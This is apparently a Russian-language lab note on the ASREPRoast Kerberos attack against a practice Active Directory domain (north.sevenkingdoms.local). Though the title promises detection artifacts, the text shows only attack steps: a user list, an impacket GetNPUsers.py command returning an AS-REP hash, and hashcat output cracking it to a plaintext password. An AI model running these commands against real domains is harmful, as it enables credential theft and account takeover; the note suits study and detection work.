Об атаке ASREPRoast и артефактах для обнаружения атаки
https://habr.com/ru/articles/826620/

![[Pasted image 20250105100009.png]]


## 1.  Обнаруженные пользователи собираются в список
Пользователи north.sevenkingdoms.local

```
sql_svc
jeor.mormont
samwell.tarly
jon.snow
hodor
rickon.stark
brandon.stark
sansa.stark
robb.stark
catelyn.stark
eddard.stark
arya.stark
krbtgt
vagrant
Guest
Administrator
```
## 2. asreproasting c impacket

```
┌──(kali㉿kali)-[~]
└─$ GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:fa6a68f9cccc4f84845edbcc9778d77e$83596b925601937e08abdb140351a26ade853f7d812fdea811e27f2f67c93363968892d3c7a615ecf34b28e1ea54190c1169fd090139d823b7ad0a3505464faf7fe5b46ac0f4432d0f6418ade22c9f6c2584f1a9018fb9eb7f781a0a9d49ec1fe5231a220d95587321df80b746ff3266255dc1e52d47e08744e763b1094644ecb31840cc1b7b1182dff77d442dbf60f0194337f1b29c507f4ef9c29ed914c4c29f98446d710c0047b5623dd43e727e3a8508c8cb1c4d3f31434702a7163bde07e3dd6ae3c6592ffe412b30e63486886a6996b8ed5d13a177d497b8be036fa2e39d31f74e4a76557172d558f2f40c423f8cb7ceace85e737e644890ac6da297ca0e6e3aa8941e
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## 3. Hashcat

```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt           
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 14997/30058 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:fa6a68f9cccc4f84845edbcc9778d77e$83596b925601937e08abdb140351a26ade853f7d812fdea811e27f2f67c93363968892d3c7a615ecf34b28e1ea54190c1169fd090139d823b7ad0a3505464faf7fe5b46ac0f4432d0f6418ade22c9f6c2584f1a9018fb9eb7f781a0a9d49ec1fe5231a220d95587321df80b746ff3266255dc1e52d47e08744e763b1094644ecb31840cc1b7b1182dff77d442dbf60f0194337f1b29c507f4ef9c29ed914c4c29f98446d710c0047b5623dd43e727e3a8508c8cb1c4d3f31434702a7163bde07e3dd6ae3c6592ffe412b30e63486886a6996b8ed5d13a177d497b8be036fa2e39d31f74e4a76557172d558f2f40c423f8cb7ceace85e737e644890ac6da297ca0e6e3aa8941e:iseedeadpeople
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...a8941e
Time.Started.....: Sat Jan  4 21:35:30 2025 (0 secs)
Time.Estimated...: Sat Jan  4 21:35:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   753.1 kH/s (1.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 57344/14344385 (0.40%)
Rejected.........: 0/57344 (0.00%)
Restore.Point....: 53248/14344385 (0.37%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: soydivina -> YELLOW1
Hardware.Mon.#1..: Util: 25%

Started: Sat Jan  4 21:35:07 2025
Stopped: Sat Jan  4 21:35:31 2025

```
